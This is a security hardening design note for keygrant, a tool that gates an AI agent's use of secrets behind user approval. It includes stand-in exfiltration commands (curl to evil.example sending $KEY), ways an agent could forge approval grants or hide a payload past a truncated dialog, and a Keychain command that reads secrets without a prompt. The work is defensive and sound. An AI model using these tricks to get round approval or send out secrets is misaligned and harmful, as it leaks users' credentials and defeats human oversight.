# P0 security hardening: approval grants

Status: in progress · Owner: Edward · 2026-10-08

## Problem

keygrant's core promise is "a secret is only used when the user approves it".
Three gaps in 0.1.2 let an agent use a secret without a meaningful approval:

1. **Grants are not bound to the command.** Approval is stored per
   `(secret, requester)`. After the user approves one harmless command, every
   other command in that session can use the secret for 15 minutes with no
   dialog — including `curl https://evil.example -d "$KEY"`. The user approved
   a command, not a session.
2. **Grants live in a user-writable file.** `grants.json` sits in
   `~/.config/keygrant/`. Any process running as the user — including the
   agent's own shell tool — can write an entry with a future `exp`. For the
   CLI path the requester is `ppid:<pid>`, which the agent can predict, so it
   can forge a grant and run `keygrant exec` with no dialog.
3. **The dialog truncates the command at 200 characters.** A long command can
   hide its harmful tail (`…; curl evil.example -d "$KEY"`) past the cut-off,
   so the user approves something they cannot see.

A fourth suspected gap — reading values straight out of the macOS Keychain
with `security find-generic-password -w`, bypassing keygrant entirely — is
**not yet verified** and is tracked separately (see "Open item").

## Solution

### Grants bound to `(session, command, secret)`, held in memory

- A grant authorises **one exact command string** to use the secrets the user
  saw in the dialog, for 15 minutes. A different command — even one character
  different — prompts again. Re-running the identical command (retries, test
  loops) does not.
- Grants live **only in the MCP server process's memory** (`GrantStore`).
  Nothing is written to disk, so there is nothing to forge. A grant dies with
  its session, which also removes the need for the `KEYGRANT_REQUESTER`
  identity scheme.
- The **CLI never reuses a grant**: every `keygrant exec` prompts. The CLI
  has no long-lived process to hold grants and no trustworthy session identity.
- `grants.json` is no longer read; a stale file from 0.1.x is ignored.

### Revocation through a "safe direction" file

`keygrant revoke NAME|--all` cannot reach the MCP process's memory, so it
writes a revocation timestamp to `~/.config/keygrant/revocations.json`. Before
honouring a grant, the server checks that the grant was issued *after* the
latest revocation for that secret (or for `*`). Tampering with this file can
only revoke more grants, never create one, so a user-writable file is fine
here.

### The dialog shows the full command

- Commands up to 2,000 characters are shown in full. Longer commands are
  **denied without a dialog**, with a message telling the agent to put the
  logic in a script file and run that instead. A reviewable approval beats a
  truncated one.
- The dialog states that approval covers this exact command only.

## Residual risks (documented, not fixed here)

- **Indirection.** If the approved command is `sh deploy.sh`, the dialog
  cannot show what `deploy.sh` does, and the agent may have written that
  file. Users must treat script invocations as approving the script.
- **Same-user processes.** Anything running as the OS user can read the
  Windows DPAPI vault or an unlocked Linux keyring. keygrant scopes *agent*
  access; it is not a defence against local malware. The agent sandbox
  (e.g. Claude Code `sandbox.filesystem.denyRead`) is the complement.
- **Exfiltration by an approved command.** Approval is the control; per-secret
  egress allowlists remain on the roadmap.

## Open item: macOS Keychain direct read

Values are written with `security add-generic-password`, which by default
adds `/usr/bin/security` to the item's trusted-application list. If that holds,
any process can read a value with `security find-generic-password -w` and no
prompt — contradicting the README's claim that the first read triggers an OS
prompt. To be verified with a throwaway secret before choosing among:
`-T ""` (no trusted app, OS prompt on every read), a signed helper with
Touch ID, or relying on the agent sandbox.

## Verification

`tests/test_grants.py` (stdlib `unittest`, dialog mocked) covers: first use
prompts; identical command reuses; a different command prompts; grants expire;
revocation (per-secret and `--all`) invalidates earlier grants; the CLI always
prompts; over-long commands are denied without a dialog; a forged
`grants.json` grants nothing.
